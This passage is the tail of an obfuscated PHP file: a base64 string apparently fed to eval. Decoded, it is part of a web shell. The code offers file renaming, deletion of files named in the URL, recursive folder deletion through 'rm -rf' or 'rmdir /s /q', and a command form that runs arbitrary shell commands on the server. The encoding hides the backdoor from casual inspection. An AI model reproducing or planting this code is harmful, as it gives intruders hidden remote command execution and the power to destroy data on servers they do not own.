iA8L2I+CiAgICAJCQk8aW5wdXQgdHlwZT0ndGV4dCcgdmFsdWU9JyIuYmFzZW5hbWUocGF0aCgpKS4iJyBuYW1lPSdmb2xkZXJuYW1lJyBzdHlsZT0nd2lkdGg6IDQ1MHB4OycgaGVpZ2h0PScxMCc+CiAgICAJCQk8aW5wdXQgdHlwZT0nc3VibWl0JyBjbGFzcz0naW5wdXQgYnRuJyBuYW1lPSdzYXZlJyB2YWx1ZT0nUkVOQU1FJz4KICAgIAkJCTwvZm9ybT4iOwogICAgCQl9ZWxzZWlmKCRfR0VUWydhY3QnXSA9PT0gJ2RlbGV0ZScpIHsKICAgIAkJCSRkZWxldGUgPSB1bmxpbmsoJF9HRVRbJ2ZpbGUnXSk7CiAgICAJCQlpZigkZGVsZXRlKSB7CiAgICAJCQkJJGFjdCA9ICI8c2NyaXB0PndpbmRvdy5sb2NhdGlvbj0nP2Rpcj0iLnBhdGgoKS4iJzs8L3NjcmlwdD4iOwogICAgCQkJfQogICAgCQkJZWxzZSB7CiAgICAJCQkJJGFjdCA9IGNvbG9yKDEsIDEsICJQZXJtaXNzaW9uIERlbmllZCEiKTsKICAgIAkJCX0KICAgIAkJCXByaW50ICRhY3Q7CiAgICAJCX1lbHNlaWYoJF9HRVRbJ2FjdCddID09PSAnZGVsZXRlX2ZvbGRlcicpIHsKICAgIAkJCWlmKGlzX2RpcihwYXRoKCkpKSB7CiAgICAJCQkJaWYoaXNfd3JpdGFibGUocGF0aCgpKSkgewogICAgCQkJCQlAcm1kaXIocGF0aCgpKTsKICAgIAkJCQkJaWYoIUBybWRpcihwYXRoKCkpIEFORCBPUygpID09PSAiTGludXgiKSBAZXhlKCJybSAtcmYgIi5wYXRoKCkpOwogICAgCQkJCQlpZighQHJtZGlyKHBhdGgoKSkgQU5EIE9TKCkgPT09ICJXaW5kb3dzIikgQGV4ZSgicm1kaXIgL3MgL3EgIi5wYXRoKCkpOwogICAgCQkJCQkkYWN0ID0gIjxzY3JpcHQ+d2luZG93LmxvY2F0aW9uPSc/ZGlyPSIuZGlybmFtZShwYXRoKCkpLiInOzwvc2NyaXB0PiI7CiAgICAJCQkJfQogICAgCQkJCWVsc2UgewogICAgCQkJCQkkYWN0ID0gY29sb3IoMSwgMSwgIkNvdWxkIG5vdCByZW1vdmUgZGlyZWN0b3J5ICciLmJhc2VuYW1lKHBhdGgoKSkuIiciKTsKICAgIAkJCQl9CiAgICAJCQl9CiAgICAJCQlwcmludCAkYWN0OwogICAgCQl9IGVsc2VpZigkX0dFVFsnYWN0J10gPT0gJ2NtZCcpewogICAgICAgICAgcHJpbnQgIjxmb3JtIG1ldGhvZD0ncG9zdCcgYWN0aW9uPSc/ZG89Y21kJmRpcj0iLnBhdGgoKS4iJyBzdHlsZT0nbWFyZ2luLXRvcDogMTVweDsnPgogIAkJCSAgIi51c2VyZ3JvdXAoKS0+bmFtZS4iQCIuJEdMT0JBTFNbJ1NFUlZFUklQJ10uIjogfiAkCiAgCQkJICA8aW5wdXQgdHlwZT0ndGV4dCcgbmFtZT0nY21kJyBzdHlsZT0nd2lkdGg6IDQ1MHB4OycgaGVpZ2h0PScxMCcgcmVxdWlyZWQ+CiAgCQkJICA8aW5wdXQgc3R5bGU9J2JvcmRlcjogbm9uZTsgYm9yZGVyLWJvdHRvbTogMXB4IHNvbGlkICNmZmZmZmY7JyBjbGFzcz0naW5wdXQgYnRuJyB0eXBlPSdzdWJtaXQnIHZhbHVlPSdFeGVjdXRlJz4KCQkJICAgIDwvZm9ybT4iOwogICAgICAgIH0KICAgICAgfWVsc2V7CiAgICAgICAgaW5kZXhpbmcoKTsKICAgICAgfQogICAgfQoKPz4=")); ?>
